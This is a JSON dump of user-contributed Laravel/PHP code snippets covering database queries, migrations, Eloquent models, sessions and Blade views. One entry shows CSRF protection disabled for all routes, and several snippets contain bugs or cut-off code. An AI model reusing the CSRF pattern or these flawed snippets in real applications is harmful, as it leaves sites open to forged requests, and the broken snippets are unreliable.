    "description": "$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\n DB::table('user')->where('email', $userEmail)->update(array('member_type' => $plan));   \n$update = \\DB::table('student') ->where('id', $data['id']) ->limit(1) ->update( [ 'name' => $data['name'], 'address' => $data['address'], 'email' => $data['email'], 'contactno' => $data['contactno'] ]);  \n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2226,
    "keyword": null,
    "link": null,
    "title": " laravel db does not exists",
    "description": "if (DB::table('orders')->where('finalized', 1)->exists()) {     // ... }  if (DB::table('orders')->where('finalized', 1)->doesntExist()) {     // ... }\n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2227,
    "keyword": null,
    "link": null,
    "title": " laravel db exists",
    "description": "if (DB::table('orders')->where('finalized', 1)->exists()) {     // ... }  if (DB::table('orders')->where('finalized', 1)->doesntExist()) {     // ... }\n$users = User::where('email', '=', $request->input('email'))->first(); if ($users === null) {   // User does not exist } else {   // User exits }\n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2228,
    "keyword": null,
    "link": null,
    "title": " laravel db inserr",
    "description": "DB::table('users')->insert([     'email' => 'kayla@example.com',     'votes' => 0 ]);\n$id = DB::table('users')->insertGetId(     ['email' => 'john@example.com', 'votes' => 0] );\nDB::select('SELECT * FROM users WHERE name = ?', array(Input::get('name'))); \nDB::table('users')->insert([     ['email' => 'picard@example.com', 'votes' => 0],     ['email' => 'janeway@example.com', 'votes' => 0], ]);\nDB::table('users')->insertOrIgnore([     ['id' => 1, 'email' => 'sisko@example.com'],     ['id' => 2, 'email' => 'archer@example.com'], ]);\n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2229,
    "keyword": null,
    "link": null,
    "title": " laravel db insert get last id",
    "description": "// how to get last inserted id in laravel  //METHOD-1 $data->save(); $lastId = $data->id;  //METHOD-2 $data = Booking::latest('id')->first(); $id = data->id;\n$id = DB::table('users')    ->insertGetId(  \t  ['name' => 'Akash Savani', 'email'=>'akash@gmail.com']  );\n$data->save(); $data->id; \n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2230,
    "keyword": null,
    "link": null,
    "title": " laravel db query",
    "description": "$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\n$users = DB::table('users')             ->where('votes', '>', 100)             ->orWhere(function($query) {                 $query->where('name', 'Abigail')                       ->where('votes', '>', 50);             })             ->get();\n DB::table('user')->whereIn('id', [100,200])->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n DB::table('user')->where('email', $userEmail)->update(array('member_type' => $plan));   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::select('select * from users');  foreach ($users as $user) {     echo $user->name; }\n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2231,
    "keyword": null,
    "link": null,
    "title": " laravel db seed specific class",
    "description": "php artisan db:seed --class=UserSeeder\n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2232,
    "keyword": null,
    "link": null,
    "title": " laravel db ssh",
    "description": "ssh -i ~/dev/awskey.pem -N -L 13306:127.0.0.1:3306 root@ip\n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2233,
    "keyword": null,
    "link": null,
    "title": " laravel db transaction",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\nuse Illuminate\\Support\\Facades\\DB;  DB::transaction(function () {     DB::update('update users set votes = 1');      DB::delete('delete from posts'); });\n// try...catch try {     // Transaction     $exception = DB::transaction(function() {          // Do your SQL here      });      if(is_null($exception)) {         return true;     } else {         throw new Exception;     }  } catch(Exception $e) {     return false; } \nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\nDB::beginTransaction(); try { /** Statement */   DB::commit(); }  catch (\\Exception $e) { /** Statement if failed */ DB::rollback(); }\nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Exception $e) {     DB::rollback();     throw $e; } catch (\\Throwable $e) {     DB::rollback();     throw $e; } \n",
    "reg_date": "2021-10-12T10:15:51.000Z"
  },
  {
    "id": 2234,
    "keyword": null,
    "link": null,
    "title": " laravel debug",
    "description": "composer require barryvdh/laravel-debugbar --dev    // config/app.php // ServiceProviders Barryvdh\\Debugbar\\ServiceProvider::class, // Facades 'Debugbar' => Barryvdh\\Debugbar\\Facade::class,   php artisan vendor:publish --provider=\"Barryvdh\\Debugbar\\ServiceProvider\"\ncomposer require barryvdh/laravel-debugbar --dev php artisan vendor:publish --provider=\"Barryvdh\\Debugbar\\ServiceProvider\"\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2235,
    "keyword": null,
    "link": null,
    "title": " laravel debugbar",
    "description": "composer require barryvdh/laravel-debugbar --dev    // config/app.php // ServiceProviders Barryvdh\\Debugbar\\ServiceProvider::class, // Facades 'Debugbar' => Barryvdh\\Debugbar\\Facade::class,   php artisan vendor:publish --provider=\"Barryvdh\\Debugbar\\ServiceProvider\"\ncomposer require barryvdh/laravel-debugbar --dev php artisan vendor:publish --provider=\"Barryvdh\\Debugbar\\ServiceProvider\"\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2236,
    "keyword": null,
    "link": null,
    "title": " laravel delete",
    "description": "# The easiest way to create a model instance is using the  # make:model Artisan command:  php artisan make:model Flight  # If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\n$flight = Flight::where('number', 'FR 900')->first();  $flight->number = 'FR 456';  $flight->refresh();  $flight->number; // \"FR 900\"\n    /**      * The attributes that are mass assignable.      */     protected $fillable = [       \t\t\t\t\t   'title',                            'slug',                            'body',                            'image',                            'published',                            'comments_open'                           ];\n// Retrieve flight by name, or create it if it doesn't exist... $flight = App\\Flight::firstOrCreate(['name' => 'Flight 10']);  // Retrieve flight by name, or create it with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrCreate(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );  // Retrieve by name, or instantiate... $flight = App\\Flight::firstOrNew(['name' => 'Flight 10']);  // Retrieve by name, or instantiate with the name, delayed, and arrival_time attributes... $flight = App\\Flight::firstOrNew(     ['name' => 'Flight 10'],     ['delayed' => 1, 'arrival_time' => '11:30'] );\nDB::table('users')->where('votes', '>', 100)->delete();\nFlight::destroy(1);  Flight::destroy(1, 2, 3);  Flight::destroy([1, 2, 3]);  Flight::destroy(collect([1, 2, 3]));\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2237,
    "keyword": null,
    "link": null,
    "title": " laravel delete confirm link",
    "description": "<a class=\"btn btn-danger\" onclick=\"return confirm('Are you sure?')\" href=\"{{route('city-delete', $result->my_id)}}\"><i class=\"fa fa-trash\"></i></a> \n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2238,
    "keyword": null,
    "link": null,
    "title": " laravel delete index",
    "description": "Schema::table('geo', function (Blueprint $table) {     $table->dropIndex(['state']); // Drops index 'geo_state_index' });\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2239,
    "keyword": null,
    "link": null,
    "title": " laravel delete relationship data",
    "description": "class User extends Eloquent {     public function photos()     {         return $this->has_many('Photo');     }      // this is a recommended way to declare event handlers     public static function boot() {         parent::boot();          static::deleting(function($user) { // before delete() method call this              $user->photos()->delete();              // do the rest of the cleanup...         });     } } \n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2240,
    "keyword": null,
    "link": null,
    "title": " laravel denny request by ip",
    "description": "//Run: //php artisan make:middleware IpMiddleware  <?php  namespace App\\Http\\Middleware;  use Closure;  class IpMiddleware {      public function handle($request, Closure $next)     {         if ($request->ip() != \"192.168.0.155\") {         // here instead of checking a single ip address we can do collection of ips         //address in constant file and check with in_array function             return redirect('home');         }          return $next($request);     }  } // END OF FILE  // --------------------- // app/Http/Kernel.php //then add the new middleware class in the $middleware property of your app/Http/Kernel.php class.  protected $routeMiddleware = [     //... other middlewares     'ipcheck' => \\App\\Http\\Middleware\\IpMiddleware::class, ]; // ------------------ ///In your route then apply middelware to routes  Route::get('/', ['middleware' => ['ipcheck'], function () {     // your routes here }]); \n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2241,
    "keyword": null,
    "link": null,
    "title": " laravel deployment",
    "description": "composer install --optimize-autoloader --no-dev\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2242,
    "keyword": null,
    "link": null,
    "title": " laravel description substring",
    "description": "{{Str::limit($category->name, 20)}}  if to end     {{Str::limit($category->name, 20, $end='.......')}}               or    {{\\Illuminate\\Support\\Str::limit($category->name, 20)}}            \nuse Illuminate\\Support\\Str;  $padded = Str::of('James')->padRight(10, '-');  // 'James-----'  $padded = Str::of('James')->padRight(10);  // 'James     '\nphp artisan vendor:publish --provider=\"Cviebrock\\EloquentSluggable\\ServiceProvider\"\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2243,
    "keyword": null,
    "link": null,
    "title": " laravel destroy session",
    "description": "# ref: https://laravel.io/forum/02-06-2014-session-destroy  Session::forget('yourKeyGoesHere') // Removes a specific variable \n<!--This is placed in the view section --> {{ session('key_name') }}\n# ref: https://laravel.io/forum/02-06-2014-session-destroy  Session::forget('yourKeyGoesHere') // Removes a specific variable\n",
    "reg_date": "2021-10-12T10:15:52.000Z"
  },
  {
    "id": 2244,
    "keyword": null,
    "link": null,
    "title": " laravel detach",
    "description": "// Detach a single role from the user... $user->roles()->detach($roleId);  // Detach all roles from the user... $user->roles()->detach();\n//id for single $user->reasons->attach($reasonId);  //array for multiple $user->reasons->attach($reasonIds);  $user->save();\n$movies = Movie::whereHas('director', function($q) {     $q->where('name', 'great'); })->get(); \n$user->roles()->attach($roleId, ['expires' => $expires]);\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2245,
    "keyword": null,
    "link": null,
    "title": " laravel difference between current time and created time",
    "description": "#1 -> 10 minutes after $lifeSpan = $now->diffForHumans($token->created_at); #2 -> \"00:10:30 Minutes\" $lifeSpan = $now->diff($token->updated_at)->format('%H:%I:%S').\" Minutes\"; \n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2246,
    "keyword": null,
    "link": null,
    "title": " laravel disable config cache",
    "description": "php artisan cache:clear - Flush the application cache  php artisan config:cache - Create a cache file for faster configuration loading. This is for configuration cache. This command will clear the configuration cache before it creates. More details  php artisan config:clear - Remove the configuration cache file\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2247,
    "keyword": null,
    "link": null,
    "title": " laravel disable csrf token",
    "description": "//In laravel 7. Open file \\App\\Http\\Middleware\\VerifyCsrfToken.php //Disable for all routes  protected $except = [     '*', ]; //Disable for some routes  protected $except = [     'mobile/*',     'news/articles', ]; //I searched for a long time how to disable CSRF completely, //there are many identical examples but they do not help\n<?php  namespace App\\Http\\Middleware;  use Illuminate\\Foundation\\Http\\Middleware\\VerifyCsrfToken as Middleware;  class VerifyCsrfToken extends Middleware {     /**      * The URIs that should be excluded from CSRF verification.      *      * @var array      */     protected $except = [         'stripe/*',         'http://example.com/foo/bar',         'http://example.com/foo/*',     ]; }\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2248,
    "keyword": null,
    "link": null,
    "title": " laravel display error message",
    "description": "@if(count($errors) > 0 ) <div class=\"alert alert-danger alert-dismissible fade show\" role=\"alert\">     <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">         <span aria-hidden=\"true\">&times;</span>     </button>     <ul class=\"p-0 m-0\" style=\"list-style: none;\">         @foreach($errors->all() as $error)         <li>{{$error}}</li>         @endforeach     </ul> </div> @endif\necho $e->getMessage();\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2249,
    "keyword": null,
    "link": null,
    "title": " laravel display multiple selected values",
    "description": "$selected = explode(\",\", $products->supplier_id);  <select  name=\"supplier_id[]\" multiple=\"multiple\">    @foreach($suppliers as $supplier)      <option value=\"{{ $supplier->id }}\" {{ (in_array($supplier->id, $selected)) ? 'selected' : '' }}>{{ $supplier->name}}</option>    @endforeach </select> \n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2250,
    "keyword": null,
    "link": null,
    "title": " laravel download",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\ncomposer global require laravel/installer  laravel new blog\nBefore starting this hope you installed composer dependancy manager for PHP. -----------------------------------------------------------------------------  So if you want to create a project by name of 'first_laravel_app' in directory C:/xampp/htdocs/ then what you need to do is  Locate your project parent directory using cmd >cd c:/xampp/htdocs  and fire this command  >composer create-project laravel/laravel first_laravel_app --prefer-dist  And its done, this is really easy and it also creates Application Key automatically for you.    # I hope it will help you. # Namaste \ncomposer global require \"laravel/installer=~1.1\"\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2251,
    "keyword": null,
    "link": null,
    "title": " laravel dropIndex",
    "description": "Schema::table('geo', function (Blueprint $table) {     $table->dropIndex(['state']); // Drops index 'geo_state_index' });\nphp artisan make:migration CreateUsersTable\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2252,
    "keyword": null,
    "link": null,
    "title": " laravel drop column",
    "description": "public function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nSchema::table('tableName', function($table) {     $table->string('column-name')->unique(); //notice the parenthesis I added });\npublic function down() {   Schema::table('users', function (Blueprint $table) {     $table->dropSoftDeletes();   }); }\n          Schema::table('articles', function($table) {              $table->dropColumn('comment_count');              $table->dropColumn('view_count');           });\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2253,
    "keyword": null,
    "link": null,
    "title": " laravel drop column if exists",
    "description": "if (Schema::hasColumn('users', 'phone')) {  \tSchema::table('users', function (Blueprint $table){        $table->dropColumn('phone');     }); }\nSchema::table('users', function (Blueprint $table) {      if (Schema::hasColumn('users', 'phone')) {               $table->dropColumn('phone'); \t\t} });\nSchema::table('users', function (Blueprint $table) {      $table->dropColumn('name'); });\n",
    "reg_date": "2021-10-12T10:15:53.000Z"
  },
  {
    "id": 2254,
    "keyword": null,
    "link": null,
    "title": " laravel drop column softdeletes",
    "description": "public function down() {   Schema::table('users', function (Blueprint $table) {     $table->dropSoftDeletes();   }); }\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\nSchema::table('users', function($table) {     $table->string(\"title\");     $table->text(\"description\");     $table->timestamps(); });\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2255,
    "keyword": null,
    "link": null,
    "title": " laravel drop foreign column",
    "description": "Schema::table('posts', function (Blueprint $table) { \t$table->dropForeign(['category_id']); });\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\n$table->dropForeign('posts_user_id_foreign');\n Class RemoveCommentViewCount extends Migration   {       public function up()       {           Schema::table('articles', function($table) {              $table->dropColumn('comment_count');              $table->dropColumn('view_count');           });       }        public function down()       {           Schema::table('articles', function($table) {              $table->integer('comment_count');              $table->integer('view_count');           });       }   }\nphp artisan make:Model Status -m\n// Searched, laravel drop foreign column Schema::table('users', function (Blueprint $table) {     $table->dropColumn(['votes', 'avatar', 'location']); });\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2256,
    "keyword": null,
    "link": null,
    "title": " laravel drop multiple columns",
    "description": "public function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\n// You may drop multiple columns from a table by passing an array of column // names to the dropColumn method. Before dropping columns from a SQLite DB, // you will need to add the doctrine/dbal dependency to your composer.json file // and run the composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn(['votes', 'avatar', 'location']); });\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2257,
    "keyword": null,
    "link": null,
    "title": " laravel drop table migration",
    "description": "php artisan make:migration drop_name_table\nphp artisan migrate:fresh  php artisan migrate:fresh --seed\n Class RemoveCommentViewCount extends Migration   {       public function up()       {           Schema::table('articles', function($table) {              $table->dropColumn('comment_count');              $table->dropColumn('view_count');           });       }        public function down()       {           Schema::table('articles', function($table) {              $table->integer('comment_count');              $table->integer('view_count');           });       }   }\nSchema::drop('users');  Schema::dropIfExists('users');\n// delete a migration safely from laravel  delete migration from database/migrations/ directory and also delete entry from migrations table\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2258,
    "keyword": null,
    "link": null,
    "title": " laravel dump]",
    "description": "$users = User::all(); dump($users);  echo \"shouts\";\n// dump <?php dump($array)?> // dump and die <?php dd($array)?>\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2259,
    "keyword": null,
    "link": null,
    "title": " laravel duplicate row",
    "description": "$data = Model::find(1); $new_data = $data->replicate(); $new_data->created_at = now(); $new_data->save();\n// Retrieve the first task $task = Task::first();  $newTask = $task->replicate(); $newTask->project_id = 16; // the new project_id $newTask->save();\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2260,
    "keyword": null,
    "link": null,
    "title": " laravel dusk run failed tests",
    "description": "/* If you had test failures the last time you ran the dusk command,  you may save time by re-running the failing tests first using  the dusk:fails command: */  php artisan dusk:fails\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2261,
    "keyword": null,
    "link": null,
    "title": " laravel dynamic attributes",
    "description": "class User extends Eloquent {       public function getFullNameAttribute()     {         return $this->first_name.' '.$this->last_name;     } }\n$user = User::find(1); $user->full_name;\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2262,
    "keyword": null,
    "link": null,
    "title": " laravel dynamic page title",
    "description": "<!-- Stored in resources/views/layouts/master.blade.php -->  <html>     <head>         <title>App Name | @yield('mytitle')</title>     </head>     <body>         <div class=\"container\">             @yield('content')         </div>     </body> </html>    <!-- Extending the master.blade.php into another view file. Eg. About Us Page -->  @extends('layouts.master')  @section('mytitle', 'About Us')  @section('content')     <h1>\"Let's Go\"</h1> @endsection\n<html> <head>     <title>App Name - @yield('title')</title> </head> <body>     @section('sidebar')         This is the master sidebar.     @show      <div class=\"container\">         @yield('content')     </div> </body>    <!-- Then you can extend pages using code below as guide  -->      @extends('layouts.master')    @section('title', 'Page Title')    @section('sidebar')   @parent   \t<p>This is appended to the master sidebar.</p>   @endsection    @section('content')   <p>This is my body content.</p>   @endsection\n",
    "reg_date": "2021-10-12T10:15:54.000Z"
  },
  {
    "id": 2263,
    "keyword": null,
    "link": null,
    "title": " laravel edit form modal example",
    "description": " <form class=\"form-group\" action=\"/update/{{$editCommunity->id}}\" method=\"post\" id=\"editCommunityForm_{{$editCommunity->id}}\">\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2264,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent date range",
    "description": "$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get();\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2265,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent debug query",
    "description": "DB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log\n/**  * Combines SQL and its bindings  *  * @param \\Eloquent $query  * @return string  */ public static function getEloquentSqlWithBindings($query) {     return vsprintf(str_replace('?', '%s', $query->toSql()), collect($query->getBindings())->map(function ($binding) {         $binding = addslashes($binding);         return is_numeric($binding) ? $binding : \"'{$binding}'\";     })->toArray()); }\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2266,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent duplicate record",
    "description": "// Retrieve the first task $task = Task::first();  $newTask = $task->replicate(); $newTask->project_id = 16; // the new project_id $newTask->save();\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2267,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get 10 records",
    "description": "Model::all()->take(10)->get();\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2268,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get 3 months",
    "description": "$dateS = Carbon::now()->startOfMonth()->subMonth(3); $dateE = Carbon::now()->startOfMonth();  $TotalSpent = DB::table('orders') ->select('total_cost','placed_at') ->whereBetween('placed_at',[$dateS,$dateE]) ->where(['deleted' => '0', 'delivery_address_id' => $DeliveryAddress->id]) ->sum('total_cost');\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2269,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get  column",
    "description": "//return array of json Model::where('id', 1)->get(['column1','column2']); or Model::all(['column1']); //return array Model::whereNull('deleted_at')->pluck('column1');\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2270,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get all",
    "description": "php artisan make:model Flight\n// To Get All ModelClassName::where('Active','=',1)->get();\nBlog::all();  //example usage. $posts = Blog::all();\n// Get all rows from Eloquent model Model::get(); \t//Get all the cars     $cars = App\\Models\\Cars::get();  // Get all rows from Eloquent model where column matches the given value Model::where('column', {value})->get(); \t//Get all the blue cars \t$blue_cars = App\\Models\\Cars::where('color', 'blue')->get(); \t//Get all the green cars \t$looking_for = 'green'; \t$green_cars = App\\Models\\Cars::where('color', $looking_for)->get();  // Get all rows from Eloquent model where column is matched conditionally Model::where('column', {condition}, {value})->get(); \t//Get all the antique cars     $antiques = App\\Models\\Cars::where('year', '<=', 2000)->get();  // Get all rows from Eloquent model with multiple where conditions \t//Get all the green antique cars     $green_antiques = App\\Models\\Cars::where(       [         \t['color', 'green'],         \t['year', '<=', 2000],       ]     )->get();  // For very large data sets use cursor() rather than get(); Model::where('column', {value})->cursor(); // Or limits Model::where('column', {value})->limit({n})->get(); \t// Get the first 10 green cars \t$some_green_cars =        App\\Models\\Cars::where('color', 'green')->limit(10)->get(); \n// Get All Where in condition  $array = [1,2,3,4,5]; ModelClassName::whereIn('columnName',$array)->get();\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2271,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get all records where",
    "description": "// To Get All ModelClassName::where('Active','=',1)->get();\n// Get all rows from Eloquent model Model::get(); \t//Get all the cars     $cars = App\\Models\\Cars::get();  // Get all rows from Eloquent model where column matches the given value Model::where('column', {value})->get(); \t//Get all the blue cars \t$blue_cars = App\\Models\\Cars::where('color', 'blue')->get(); \t//Get all the green cars \t$looking_for = 'green'; \t$green_cars = App\\Models\\Cars::where('color', $looking_for)->get();  // Get all rows from Eloquent model where column is matched conditionally Model::where('column', {condition}, {value})->get(); \t//Get all the antique cars     $antiques = App\\Models\\Cars::where('year', '<=', 2000)->get();  // Get all rows from Eloquent model with multiple where conditions \t//Get all the green antique cars     $green_antiques = App\\Models\\Cars::where(       [         \t['color', 'green'],         \t['year', '<=', 2000],       ]     )->get();  // For very large data sets use cursor() rather than get(); Model::where('column', {value})->cursor(); // Or limits Model::where('column', {value})->limit({n})->get(); \t// Get the first 10 green cars \t$some_green_cars =        App\\Models\\Cars::where('color', 'green')->limit(10)->get(); \n// Get All Where in condition  $array = [1,2,3,4,5]; ModelClassName::whereIn('columnName',$array)->get();\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2272,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get first",
    "description": "// return first row by id $user = App\\User::where('id',$id)->first(); // or return directly a field $userId = App\\User::where(...)->pluck('id');\n$user = User::where('mobile', Input::get('mobile'))->get();  if (!$user->isEmpty()){     $firstUser = $user->first() }\nforeach (Flight::where('foo', 'bar')->cursor() as $flight) {     // }\n",
    "reg_date": "2021-10-12T10:15:55.000Z"
  },
  {
    "id": 2273,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent get only field name",
    "description": "//Eloquent: Get specific columns (not all the row). Pluck returns an array. Model::where('id', 1)->pluck('name', 'surname'); // If you only want to get the result value: Model::where('id', 1)->value('name');\n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2274,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent increment",
    "description": "Customer::find($customer_id)->increment('loyalty_points');       // increment by 20    Customer::find($customer_id)->increment('loyalty_points',20);\n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2275,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent order by alphabetical order",
    "description": "  $items = Item::orderBy('name')->get(); \n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2276,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent randomise data from database",
    "description": "Model::select('column')     ->where('column','value')     ->inRandomOrder()     ->limit(2) // here is yours limit     ->get(); \nModelName::where('column',$condition)->random($number)->get();\n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2277,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent remove from db",
    "description": "$res=User::where('id',$id)->delete(); \npublic function destroy($id){    $res=User::find($id)->delete();   if ($res){     $data=[     'status'=>'1',     'msg'=>'success'   ];   }else{     $data=[     'status'=>'0',     'msg'=>'fail'   ];   return response()->json($data); \nuse App\\Models\\Flight;  $flight = Flight::find(1);  $flight->delete();\n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2278,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent search query 2020",
    "description": "$result = Marriage::where('name','LIKE','%'.$email_or_name.'%')                 ->orWhere('email','LIKE','%'.$email_or_name.'%')                 ->get();\n$searchTerm ='milad zamir Abc'; $reservedSymbols = ['-', '+', '<', '>', '@', '(', ')', '~']; $searchTerm = str_replace($reservedSymbols, ' ', $searchTerm);  $searchValues = preg_split('/\\s+/', $searchTerm, -1, PREG_SPLIT_NO_EMPTY);  $res = User::where(function ($q) use ($searchValues) { \tforeach ($searchValues as $value) {     $q->orWhere('name', 'like', \"%{$value}%\");     $q->orWhere('family_name', 'like', \"%{$value}%\");     } })->get();\n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2279,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent select one column",
    "description": "//Select specific Column  $data = ModelClassName::select('columnName')->get(); \n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2280,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent sum column",
    "description": "Product::where('id',$id)->sum('quantity');\nAuth::user()->products->sum('price'); // And on your App/User.php you need someting like this: public function products(){   return Products::where('id_buyer', Auth::user()->id)->get(); }\n",
    "reg_date": "2021-10-12T10:15:56.000Z"
  },
  {
    "id": 2281,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent to array key value",
    "description": "Icon::all()->keyBy('name') \n$roles = collect(DB::table('roles')->get())->keyBy('name'); \n$roles = Role::all()->keyBy('name'); \n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2282,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent whereDateBetween",
    "description": "$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get();\n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2283,
    "keyword": null,
    "link": null,
    "title": " laravel eloquent without relation",
    "description": "$books = Book::without('author')->get();\nFor example, a blog post may have an infinite number of comments. And a single comment belongs to only a single post    class Post extends Model {     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }  class Comment extends Model {     public function post()     {         return $this->belongsTo('App\\Models\\Post');     } }\n$movies = Movie::whereHas('director', function($q) {     $q->where('name', 'great'); })->get(); \n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2284,
    "keyword": null,
    "link": null,
    "title": " laravel encrypt decrypt",
    "description": "# Searched for Laravel 5.8 # Check https://laravel.com/docs/5.8/encryption for different Laravel versions. use Illuminate\\Support\\Facades\\Crypt;  $encrypted = Crypt::encryptString('Hello world.');  $decrypted = Crypt::decryptString($encrypted);\n",
    "reg_date": "2021-10-12T10:15:57.000Z"
  },
  {
    "id": 2285,
    "keyword": null,
    "link": null,
    "title": " laravel enum migration",
